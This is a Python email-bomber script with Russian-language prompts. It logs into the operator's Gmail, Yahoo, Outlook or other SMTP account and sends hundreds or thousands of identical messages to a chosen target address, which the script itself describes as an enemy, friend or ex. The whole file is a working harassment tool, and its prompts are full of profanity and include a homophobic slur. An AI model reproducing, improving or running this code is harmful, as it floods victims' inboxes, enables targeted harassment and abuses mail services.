#print("if u're english speaking dude, u better dont use my shit, cuz its only for russians, buut it's up to you")
import smtplib
import sys
import time




print('   ЭЙ ДРУЖОК ПИРОЖОК ТЕБЕ ПОНАДОБИТЬСЯ 1)ЭМАЙЛ АККАУНТ С ВКЛЮЧЕННЫМ РАЗРЕШЕНИЕМ НА СТОРОННИЕ ПРОГРАММЫ(для smtplib) И 2)ЭМАЙЛ КОТОРЫЙ ХОЧЕШЬ РАЗЪЕБАТЬ')
print('---------------------------------------------------------------------------------------------------')
print('   У ТЕБЯ ЕСТЬ ВСЁ ВЫШЕПЕРЕЧИСЛЕННОЕ?')
s=int(input("1:ДА  2:НЕТ  >>>"))
if s == 2:
    print("ТОБОЮ ВЫБРАНА НЕПРАВИЛЬНАЯ ДВЕРЬ, КЛУБ КОЖЕВЕННОГО РЕМЕСЛА 2 БЛОКА ВНИЗ, ПОШЕЛ НАХУЙ")
    time.sleep(4)
    sys.exit(1)
elif s == 1:
    print('ХОРОШ, ТАК ДЕРЖАТЬ')
else:
    print("ЧЕ ЗА ХУЙНЮ ТЫ НАПИСАЛ, ТЫ ЧЕ НЕ ПОНЯЛ? НАПИШИ 1 ИЛИ 2")
    s=int(input("1:ДА  2:НЕТ  >>>"))
    if s == 2:
        print("ТОБОЮ ВЫБРАНА НЕПРАВИЛЬНАЯ ДВЕРЬ, КЛУБ КОЖЕВЕННОГО РЕМЕСЛА 2 БЛОКА ВНИЗ, ПОШЕЛ НАХУЙ")
        time.sleep(4)
        sys.exit(1)
    elif s == 1:
        print('ХОРОШ, ТАК ДЕРЖАТЬ')
    else:
        print('ТЫ МЕНЯ ЗАЕБАЛ, ДИ НАХУЙ, ПИДОР БЛЯ')
        time.sleep(3)
        sys.exit(1)





def banner():
    print('  EDITED BY KRAKENSEL, AUTHOR: w3w3w3')
    print('''   
──────────────────────────────────────────────────────────────────────────────────██
███─███─████─███────████─█──█─███──███──████──────███─████────███─████─████─████─█──█
─█──█───█────█──────█──█─█──█───█──█─█──█──█────────█─█──█─────█──█──█─█────█──█─█──█
─█──███─████─███────█──█─█─██─███──█─█──████──────███─████─────█──█──█─████─█──█─█─██
─█──█───█──█─█──────█──█─██─█───█─█████─█──█─█──────█─█──█─────█──█──█─█──█─█──█─██─█
─█──███─████─███────█──█─█──█─███─█───█─█──█─█────███─█──█─────█──████─████─████─█──█


█─█─█─█─█─███────███──███──███─███────█──█─████─████─████──███
█─█─█████─█──────█────█─█──█────█─────█──█─█──█─█──█─█──█──█─█
███──███──███────███──█─█──███──█─────████─████─████─████──█─█
──█─█████─█──────█───█████─█────█─────█──█─█──█─█─────█─█─█████
███─█─█─█─███────███─█───█─███──█─────█──█─█──█─█─────█─█─█───█

''')






class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print('\n  СЁ, ГОТОВО НАХУЙ')
            self.target = str(input('    ЭМАЙЛ, КОГО ХОШ ЗАХУЯРИТЬ (пример > zalupa@mail.ru) <: '))
            self.mode = int(input('   ВЫБЕРИ УРОВЕНЬ РАЗЪЁБА (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(свой) <: '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('   ОШИБКА БЛЯТЬ, ПОШЕЛ НАХУЙ')
                sys.exit(1)
        except Exception as e:
            print(f'ОШИБКА: {e}')

    def bomb(self):
        try:
            print('\n ГОТОВЛЮ БОМБЫ')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input('  НАПИШИ СВОЕ КОЛ-ВО <: '))
            print(f'\n  ТЫ ВЫБРАЛ РЕЖИМ: {self.mode} И {self.amount} БОМБ')
        except Exception as e:
            print(f'ОШИБКА: {e}')

    def email(self):
        try:
            print('\n ГОТОВЛЮ ЭМАЙЛ')
            self.server = str(input('ВЫБЕРИ СЕРВЕР ТВОЕГО ЭМАЙЛА - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input('ВВЕДИ НОМЕР ПОРТА <: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input('ВВЕДИ ТВОЙ ЭМАЙЛ <: '))
            self.fromPwd = str(input('ВВЕДИ ПАРОЛЬ <: '))
            self.subject = str(input('НАПИШИ ТЕМУ, ВСЯКУЮ ХУЕТУ <: '))
            self.message = str(input('НАПИШИ СООБЩЕНИЕ, ТОЖЕ ТРЭШ КАКОЙ-НИБУДЬ<: '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ОШИБКА: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(f'БОМБА: {self.count}')
        except Exception as e:
            print(f'ОШИБКА: {e}')

    def attack(self):
        print('\n ХУЯРЮ ТВОЕГО НЕДРУГА, А МОЖЕТ ДРУГА, БЫВШЕГО')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print('\n  РАЗЪЕБ ЗАКОНЧЕН')
        time.sleep(3)
        sys.exit(0)


if __name__=='__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()